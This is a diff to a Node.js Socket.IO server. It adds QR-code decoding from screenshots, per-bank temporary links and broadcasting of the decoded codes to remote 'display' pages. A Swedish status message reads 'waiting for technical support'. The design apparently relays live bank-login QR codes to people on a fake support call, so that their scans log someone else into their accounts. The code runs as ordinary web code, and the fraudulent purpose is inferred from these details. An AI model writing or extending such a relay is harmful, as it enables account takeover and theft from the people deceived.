@@ -13,6 +13,8 @@ const io = require('socket.io')(http, {
 const path = require('path');
 const crypto = require('crypto');
 const config = require('./config');
+const Jimp = require('jimp');
+const QrCode = require('qrcode-reader');
 
 // Session storage for temporary URLs
 const temporaryUrls = new Map();
@@ -30,7 +32,9 @@ function createTemporaryUrl(bankId, expirationMinutes = 720) {
     temporaryUrls.set(token, {
         bankId,
         expiration,
-        qrData: null
+        qrData: null,
+        displayConnected: false,
+        lastStatus: 'waiting' // 'waiting' or 'qr_received'
     });
     
     return token;
@@ -250,6 +254,35 @@ app.get('/api/qr', (req, res) => {
     res.status(200).json({ message: 'QR code endpoint is ready' });
 });
 
+// API endpoint to get status of a temporary URL
+app.get('/api/url-status/:token', (req, res) => {
+    const { token } = req.params;
+    const session = temporaryUrls.get(token);
+    
+    if (!session) {
+        return res.status(404).json({ error: 'URL not found' });
+    }
+    
+    if (session.expiration < Date.now()) {
+        temporaryUrls.delete(token);
+        return res.status(404).json({ error: 'URL expired' });
+    }
+    
+    // Determine status based on qrData and display connection
+    const status = session.qrData ? 'qr_received' : 'waiting';
+    const statusText = session.qrData ? 'QR kod mottagen' : 'Väntar på teknisk support';
+    
+    res.status(200).json({
+        token,
+        bankId: session.bankId,
+        status,
+        statusText,
+        hasQR: !!session.qrData,
+        displayConnected: session.displayConnected || false,
+        expiresAt: session.expiration
+    });
+});
+
 app.post('/api/qr', (req, res) => {
     console.log('Received QR code request from:', req.get('origin'));
     console.log('Request headers:', req.headers);
@@ -278,7 +311,9 @@ app.post('/api/qr', (req, res) => {
         // If session token is provided, store QR for that session
         if (sessionToken && temporaryUrls.has(sessionToken)) {
             console.log('Storing QR for session:', sessionToken);
-            temporaryUrls.get(sessionToken).qrData = qrData;
+            const session = temporaryUrls.get(sessionToken);
+            session.qrData = qrData;
+            session.lastStatus = 'qr_received';
         }
 
         // Log extension metadata if provided
@@ -307,25 +342,104 @@ app.post('/api/qr', (req, res) => {
     }
 });
 
+// New endpoint: Decode QR code from screenshot
+app.post('/api/qr-decode', async (req, res) => {
+    console.log('Received QR decode request from:', req.get('origin'));
+    const screenshot = req.body.screenshot;
+    
+    if (!screenshot) {
+        return res.status(400).json({ error: 'No screenshot provided' });
+    }
+    
+    try {
+        // Convert base64 image to buffer
+        const base64Data = screenshot.replace(/^data:image\/\w+;base64,/, '');
+        const imageBuffer = Buffer.from(base64Data, 'base64');
+        
+        // Load image with Jimp
+        const image = await Jimp.read(imageBuffer);
+        
+        // Create QR code reader
+        const qr = new QrCode();
+        
+        // Decode QR code
+        const qrData = await new Promise((resolve, reject) => {
+            qr.callback = (err, value) => {
+                if (err) {
+                    reject(err);
+                } else {
+                    resolve(value);
+                }
+            };
+            qr.decode(image.bitmap);
+        });
+        
+        if (qrData && qrData.result) {
+            console.log('✅ QR code decoded from screenshot:', qrData.result);
+            
+            // Broadcast the QR code image to displays
+            io.emit('new_qr', screenshot);
+            
+            res.status(200).json({
+                success: true,
+                qrData: screenshot, // Send back the image for display
+                qrString: qrData.result, // The decoded QR string
+                activeDisplays: Array.from(connectedDisplays),
+                timestamp: new Date().toISOString()
+            });
+        } else {
+            res.status(200).json({
+                success: false,
+                message: 'No QR code found in image'
+            });
+        }
+    } catch (error) {
+        console.error('Error decoding QR code:', error);
+        res.status(200).json({
+            success: false,
+            message: 'Could not decode QR code: ' + error.message
+        });
+    }
+});
+
 // Socket.IO connection handling
 io.on('connection', (socket) => {
     console.log('New connection:', socket.id);
 
-    socket.on('register_display', (displayId) => {
-        console.log(`Display ${displayId} registered`);
-        connectedDisplays.add(displayId);
+    socket.on('register_display', (data) => {
+        const displayId = typeof data === 'string' ? data : (data ? data.displayId : null);
+        const token = typeof data === 'object' && data ? data.token : null;
+        
+        console.log(`Display ${displayId || 'unknown'} registered${token ? ' with token ' + token : ''}`);
+        if (displayId) {
+            connectedDisplays.add(displayId);
+        }
+        
+        // If token is provided, mark that URL as having a connected display
+        if (token && temporaryUrls.has(token)) {
+            temporaryUrls.get(token).displayConnected = true;
+            console.log(`Token ${token} is now connected to display ${displayId || 'unknown'}`);
+        }
+        
+        socket.displayId = displayId;
+        socket.token = token;
+        
         io.emit('displays_updated', Array.from(connectedDisplays));
     });
 
     socket.on('disconnect', () => {
         console.log('Client disconnected:', socket.id);
         // Remove display from tracking
-        connectedDisplays.forEach(displayId => {
-            if (socket.displayId === displayId) {
-                connectedDisplays.delete(displayId);
-                io.emit('displays_updated', Array.from(connectedDisplays));
-            }
-        });
+        if (socket.displayId) {
+            connectedDisplays.delete(socket.displayId);
+        }
+        
+        // If this socket had a token, mark it as disconnected
+        if (socket.token && temporaryUrls.has(socket.token)) {
+            temporaryUrls.get(socket.token).displayConnected = false;
+        }
+        
+        io.emit('displays_updated', Array.from(connectedDisplays));
     });
 });
 
